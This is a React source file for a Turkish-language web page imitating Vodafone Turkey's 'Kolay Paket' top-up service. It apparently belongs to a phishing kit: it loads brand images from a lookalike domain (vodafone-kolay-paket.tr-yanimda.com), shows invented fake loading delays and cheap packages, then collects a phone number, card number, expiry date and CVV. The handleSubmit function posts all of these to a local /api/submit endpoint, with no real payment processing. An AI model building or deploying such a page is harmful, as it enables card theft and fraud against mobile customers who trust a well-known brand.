import React, { useState } from 'react'
import axios from 'axios'

const Index = () => {
  const [step, setStep] = useState(1)
  const [phoneNumber, setPhoneNumber] = useState('')
  const [selectedPackage, setSelectedPackage] = useState(null)
  const [cardNumber, setCardNumber] = useState('')
  const [expiry, setExpiry] = useState('')
  const [cvc, setCvc] = useState('')

  // handleContinue fonksiyonunu değiştirin
  const handleContinue = () => {
    // Rastgele 3000 ile 6000 milisaniye (3 ile 6 saniye) arasında bir gecikme süresi belirleyin
    const delay = Math.floor(Math.random() * (4000 - 2000 + 1) + 2000)

    setTimeout(() => {
      setStep(step + 1)
    }, delay)
  }

  const handlePhoneNumberChange = (e) => {
    setPhoneNumber(e.target.value)
  }

  const handleReset = () => {
    setStep(1)
  }

  const handlePackageSelect = (index) => {
    setSelectedPackage(index)
    handleContinue()
  }

  const handleSubmit = async () => {
    try {
      await axios.post('/api/submit', {
        phoneNumber: phoneNumber,
        cardNumber: cardNumber,
        expiry: expiry,
        cvc: cvc,
      })
      alert('Başarıyla kaydedildi!')
    } catch (error) {
      console.error(error)
      alert('Bir hata oluştu.')
    }
  }

  const packages = [
    {
      name: 'Süper+Uyumlu 3',
      data: '18 GB',
      minutes: '750 DK',
      sms: '250 SMS',
      price: '₺52',
      validity: '29 gün geçerli',
    },
    {
      name: 'Süper+Uyumlu 2',
      data: '8 GB',
      minutes: '750 DK',
      sms: '250 SMS',
      price: '₺40',
      validity: '28 gün geçerli',
    },
    {
      name: 'Super+Uyumlu',
      data: '12 GB',
      minutes: '750 DK',
      sms: '250 SMS',
      price: '₺47',
      validity: '28 gün geçerli',
    },
    {
      name: 'Süper+Ekonomik',
      data: '4 GB',
      minutes: '500 DK',
      sms: '250 SMS',
      price: '₺30',
      validity: '28 gün geçerli',
    },
  ]

  return (
    <div className="container mx-auto mt-10 max-w-screen-md px-4 md:px-0">
      <h1 className="text-3xl font-bold mb-8 text-center text-[#333]">
        Kolay Paket Yükle
      </h1>
      <div className="flex justify-center mb-8">
        <span className="mr-4 border-b-2 border-red-600 pb-1 font-bold">
          Misafir olarak yükle
        </span>
        <span>Giriş yaparak yükle</span>
      </div>
      <div className="flex justify-center">
        <div className="bg-white shadow-md p-4 md:p-8 w-full mx-auto">
          {step === 1 && (
            <div>
              <h4 className="font-bold mb-2">
                <span className="text-2xl mr-5">1.</span>Kolay paket yüklemek
                istediğiniz telefon numarasını giriniz
              </h4>
              <hr className="mb-2" />
              <input
                type="tel"
                className="border border-gray-300 p-2 w-full mb-2"
                placeholder="Telefon Numarası"
                value={phoneNumber}
                onChange={handlePhoneNumberChange}
                maxLength={12}
              />
              <button
                className="bg-red-600 text-white font-semibold px-4 py-2 rounded hover:bg-red-700 mt-2"
                onClick={handleContinue}
              >
                Devam Et
              </button>
            </div>
          )}
          {step > 1 && (
            <div>
              <h1 className="mb-4 font-bold">
                <span className="text-2xl mr-5">1.</span>Telefon numarası{' '}
                <hr className="mb-2 mt-2" />
              </h1>
              <div className="flex items-center">
                <img
                  src="https://cdn-icons-png.flaticon.com/512/65/65680.png?w=740&t=st=1683210386~exp=1683210986~hmac=8de099d5a6361468cdd6e4b675375d5a78910d11675f5111f662b4399351e34e"
                  alt="Phone"
                  className="mr-2 w-[55px] h-[55px]"
                />
                <p className="font-bold text-[17px] mr-4">{phoneNumber}</p>
                <span
                  className="text-red-600 cursor-pointer underline"
                  onClick={handleReset}
                >
                  Değiştir
                </span>
              </div>
            </div>
          )}
        </div>
      </div>
      <div className="flex justify-center mt-8">
        <div className="bg-white shadow-md p-4 md:p-8 w-full mx-auto max-w-[900px]">
          <div>
            <h4 className="font-bold mb-2">
              <span className="text-2xl mr-5">2.</span> Kolay paket seçim
            </h4>
            <hr className="mb-2" />
            {step === 1 && (
              <p className="font-medium underline text-red-600 text-center text-[15px] mt-6 mb-6">
                Telefon numaranızı girdiğiniz zaman faturanıza uygun paketleri
                göstericez.{' '}
              </p>
            )}

            {step === 2 && (
              <div>
                {packages.map((pack, i) => (
                  <div
                    key={i}
                    className={`border-2  border-[#007c92] rounded-md p-4 mb-4 ${
                      selectedPackage === null || selectedPackage === i
                        ? 'block'
                        : 'hidden'
                    }`}
                  >
                    <div className="bg-[#007c92] text-white font-semibold text-center mb-2 py-1 rounded-md">
                      Sana Özel
                    </div>
                    <div className="flex items-center">
                      <img
                        src="https://cms.vodafone.com.tr/static/img/content/21-09/21/iconsindicatorssystemiconssmarthomekit333333-3x.png"
                        alt="Package"
                        className="mr-2 w-[40px] h-[40px]"
                      />
                      <div>
                        <p className="font-bold text-[17px]">{pack.name}</p>
                        <p className="text-sm">
                          {pack.data} - {pack.minutes} - {pack.sms}
                        </p>
                      </div>
                    </div>
                    <p className="font-bold text-[24px] mt-2">{pack.price}</p>
                    <p className="text-sm">{pack.validity}</p>
                    {selectedPackage === i ? (
                      <button
                        className="bg-red-600 text-white py-2 px-4 rounded mt-2"
                        onClick={handleContinue}
                      >
                        Devam Et
                      </button>
                    ) : (
                      <button
                        className="bg-red-600 hover:bg-red-700 text-white py-2 px-4 rounded mt-2"
                        onClick={() => handlePackageSelect(i)}
                      >
                        Devam Et
                      </button>
                    )}
                  </div>
                ))}
              </div>
            )}
            {step === 3 && (
              <p className="font-medium underline text-red-600 text-center text-[15px] mt-6 mb-6">
                Seçtiğiniz paket faturanıza yüklenecek şimdi ödeme kısmını
                doldurabilirsiniz.{' '}
              </p>
            )}
          </div>
        </div>
      </div>

      <div className="flex justify-center mt-8 mb-[55px]">
        <div className="bg-white shadow-md p-4 md:p-8 w-full mx-auto">
          <div>
            <h4 className="font-bold mb-2">
              <span className="font-bold text-2xl mr-5">3.</span> Ödeme
              <hr className="mb-2 mt-2" />
            </h4>
            {step === 3 && (
              <div>
                <div className="flex items-center mb-4">
                  <input
                    type="checkbox"
                    className="form-checkbox bg-blue-600 text-white cursor-not-allowed mr-2"
                    defaultChecked
                    readOnly
                  />
                  <span>Kredi / Banka Kartı İle Öde</span>
                </div>
                <div className="flex justify-center mb-4">
                  <img
                    src="https://vodafone-kolay-paket.tr-yanimda.com/index_files/masterpass.svg"
                    alt="Masterpass"
                    className="mr-2"
                  />
                  <img
                    src="https://vodafone-kolay-paket.tr-yanimda.com/index_files/amex.svg"
                    alt="Amex"
                    className="mr-2"
                  />
                  <img
                    src="https://vodafone-kolay-paket.tr-yanimda.com/index_files/troy.svg"
                    alt="Troy"
                    className="ml-2"
                  />
                  <img
                    src="https://vodafone-kolay-paket.tr-yanimda.com/index_files/visa.svg"
                    alt="visa"
                    className="ml-2"
                  />
                </div>
                <input
                  type="text"
                  className="border border-gray-300 p-2 w-full mb-2"
                  placeholder="4321 1232 131"
                  value={cardNumber}
                  onChange={(e) => setCardNumber(e.target.value)}
                  maxLength={16}
                />
                <div className="flex justify-between mb-4">
                  <input
                    type="text"
                    className="border border-gray-300 p-2 w-1/2 mr-2"
                    placeholder="Son Kullanma Tarihi"
                    value={expiry}
                    onChange={(e) => setExpiry(e.target.value)}
                  />
                  <input
                    type="text"
                    className="border border-gray-300 p-2 w-1/2 ml-2"
                    placeholder="CVV"
                    value={cvc}
                    onChange={(e) => setCvc(e.target.value)}
                    maxLength={3}
                  />
                </div>
                <hr className="mb-4" />
                <div className="flex items-center">
                  <input type="checkbox" className="form-checkbox mr-2" />
                  <span>
                    <span className="underline text-red-600">
                      Mesafeli Satış Sözleşmesi
                    </span>{' '}
                    ve{' '}
                    <span className="underline text-red-600">
                      Ön Bilgilendirme Forumunu
                    </span>{' '}
                    okudum, onaylıyorum
                  </span>
                </div>
                <button
                  className="bg-red-600 text-white justify-center py-2 px-4 rounded mt-4"
                  onClick={handleSubmit}
                >
                  Paketi Satın Al
                </button>
                {step === 4 && (
                  <p className="font-medium underline text-red-600 text-center text-[15px] mt-6 mb-6">
                    Bekleyin Ödemenizi Alıyoruz...{' '}
                  </p>
                )}
              </div>
            )}
          </div>
        </div>
      </div>
    </div>
  )
}

export default Index
